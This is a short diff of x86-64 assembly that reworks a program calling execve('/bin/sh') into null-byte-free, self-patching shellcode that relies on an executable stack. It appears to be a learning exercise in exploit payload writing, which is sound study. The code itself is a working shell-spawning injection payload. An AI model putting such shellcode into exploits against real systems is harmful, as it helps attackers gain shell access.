@@ -1,22 +1,25 @@
-.data
-# sh:
-#     .asciz "/bin/sh"
-
 .global _start
 
 .text
 _start:
-    xorl %eax, %eax
     jmp next
 sh:
-    .asciz "/bin/sh"
+    .ascii "/bin/sh"
+eol:
+    .byte 0xff
 next:
-    movb $59, %al
+    xorl %eax, %eax
+    # stack is executable, i can do this
+    movb %al, eol(%rip)
     leaq sh(%rip), %rdi
+    # sys_execve
+    movb $59, %al
     xorl %edx, %edx
     xorl %esi, %esi
     syscall
 
-    movq $60, %rax
-    movq $0, %rdi
+    # sys_exit
+    xorl %eax, %eax
+    movb $60, %al
+    xorl %edi, %edi
     syscall
